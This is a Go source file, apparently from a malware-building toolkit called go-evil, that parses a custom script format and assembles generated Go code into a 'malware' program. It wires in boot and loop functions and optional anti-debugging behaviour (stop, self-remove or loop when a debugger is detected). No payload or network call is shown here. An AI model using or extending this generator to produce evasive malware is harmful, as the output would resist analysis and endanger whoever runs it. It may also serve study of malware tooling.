package parsing

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

//
//
// preface before we start parsing
//
//
func preface(s_json string) string {
	Check_for_errors(s_json)             // Checks for common errors found in the file
	s_json = Check_configuration(s_json) // Checks for a configuration setting in the file
	s_json = Find_imports(s_json)        // Finds all imports in the file
	s_json = Strip(s_json)               // Removes the configuration section and every comment found
	s_json = Build_functions(s_json)     // Builds function structs for each found function
	return s_json
}

//
//
// This functions binds everything togheter and will generate a complete go code in the structure
//
//
func fill_malware_gut(s_json string) string {
	data_object := structure.Receive(s_json)

	// Link imports
	data_object.Add_malware_line("import (")
	for _, new_import := range data_object.GO_imports {
		data_object.Add_malware_line(new_import)
	}
	data_object.Add_malware_line(")")

	// Link structs
	if len(data_object.GO_struct) > 0 {
		for _, new_struct := range data_object.GO_struct {
			data_object.Add_malware_line(new_struct)
		}
	}

	// Link const
	if len(data_object.GO_const) > 0 {
		data_object.Add_malware_line("const (")
		for _, new_const := range data_object.GO_const {
			data_object.Add_malware_line(new_const)
		}
		data_object.Add_malware_line(")")
	}

	// Link globals
	if len(data_object.GO_global) > 0 {
		for _, new_global := range data_object.GO_global {
			data_object.Add_malware_line(new_global)
		}
	}

	// Link functions
	for _, new_func := range data_object.GO_functions {
		data_object.Add_malware_line(new_func)
	}

	return structure.Send(data_object)
}

//
//
// Generates the main function
//
//
func generate_main_function(s_json string, boot_functions []string, loop_functions []string) string {
	data_object := structure.Receive(s_json)

	// Create the main function here
	main_functions := []string{"func main(){"}

	main_functions = append(main_functions, "spine.alpha.alphabet = []string{\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\", \"H\", \"I\", \"J\", \"K\", \"L\", \"M\", \"N\", \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\", \"!\", \"#\", \"$\", \"€\", \"%\", \"&\", \"\\\"\", \"(\", \")\", \"*\", \"+\", \",\", \"-\", \".\", \"/\", \":\", \";\", \"<\", \"=\", \">\", \"?\", \"@\", \"[\", \"\\\\\", \"]\", \"^\", \"_\", \"`\", \"{\", \"|\", \"}\", \"~\", \" \", \"\\t\", \"\\n\", \"\\r\", \"\\x0b\", \"\\x0c\"}")

	main_functions = append(main_functions, fmt.Sprintf("spine.variable.roof = %d", data_object.Var_max))
	main_functions = append(main_functions, "spine.variable.pointer = 0")

	main_functions = append(main_functions, "spine.variable.values = make([]string, spine.variable.roof)")

	for i := 0; i < data_object.Var_max; i++ { // Add default value for each entry
		main_functions = append(main_functions, fmt.Sprintf("spine.variable.values[%d] = \"\"", i))
	}

	main_functions = append(main_functions, "spine.path = tools.Grab_executable_path()")

	// Add boot functions
	for _, boot_name := range boot_functions {
		main_functions = append(main_functions, fmt.Sprintf("%s()", boot_name))
	}

	// Decide the header of the for loop
	switch data_object.Debugger_behavior {
	case "stop":
		main_functions = append(main_functions, "for !stop_behavior() && !detect_debugger_time() {")
	case "remove":
		main_functions = append(main_functions, "for !remove_behavior() && !detect_debugger_time() {")
	case "none":
		main_functions = append(main_functions, "for {")
	case "loop":
		main_functions = append(main_functions, "for !loop_behavior() && !detect_debugger_time() {")
	}

	// Add loop function
	for _, loop_name := range loop_functions {
		main_functions = append(main_functions, (fmt.Sprintf("%s()", loop_name)))
	}

	main_functions = append(main_functions, "}}")

	data_object.Add_go_function(main_functions)

	return structure.Send(data_object)

}

//
//
// Identify sub function type and populates two string arrays
//
//
func identify_sub_func(d_funcs []structure.Func_t) ([]string, []string) {
	boot_functions := []string{}
	loop_functions := []string{}

	for _, d_func := range d_funcs {

		// Identify the function type
		if d_func.Func_type == "b" {
			boot_functions = append(boot_functions, d_func.Name)

		} else if d_func.Func_type == "l" {
			loop_functions = append(loop_functions, d_func.Name)

		}
	}

	return boot_functions, loop_functions
}

//
//
// Converts each sub function to golang code
//
//
func generate_sub_functions(s_json string) (string, []string, []string) {
	data_object := structure.Receive(s_json)

	boot_func, loop_func := identify_sub_func(data_object.Functions)

	for _, d_func := range data_object.Functions {

		data := []string{fmt.Sprintf("func %s(){", d_func.Name)}

		converted_code, s_json := convert_code(d_func.Gut, structure.Send(data_object))

		data = append(data, converted_code...)

		data = append(data, "}")

		data_object = structure.Receive(s_json)
		data_object.Add_go_function(data)
	}

	return structure.Send(data_object), boot_func, loop_func
}

//
//
// Generate structs
//
//
func generate_structs(s_json string) string {
	s_json = generate_runtime_variable(s_json)
	s_json = generate_crypt(s_json)
	s_json = generate_alpha(s_json)

	s_json = generate_spine(s_json)

	return s_json
}

//
//
// Generate behavior function for debugging
//
//
func generate_behavior_debugging(s_json string) string {
	data_object := structure.Receive(s_json)

	if data_object.Debugger_behavior != "none" {
		s_json = identify_debugger(s_json) // Adds neccessary code to identify a debugger
		s_json = identify_debugger_with_time(s_json)

		switch data_object.Debugger_behavior {
		case "stop":
			s_json = stop_behavior(s_json)
		case "remove":
			s_json = remove_behavior(s_json)
		case "loop":
			s_json = loop_behavior(s_json)
		}
	}

	return s_json
}

//
//
// Parses the contents of the provided file
//
//
func Parse(s_json string) string {
	s_json = preface(s_json) // Handles every preface we could possibly want done before we start parsing

	s_json = generate_structs(s_json)

	s_json = generate_behavior_debugging(s_json)

	s_json, boot_func, loop_func := generate_sub_functions(s_json)

	s_json = generate_main_function(s_json, boot_func, loop_func)

	s_json = fill_malware_gut(s_json)

	return s_json
}
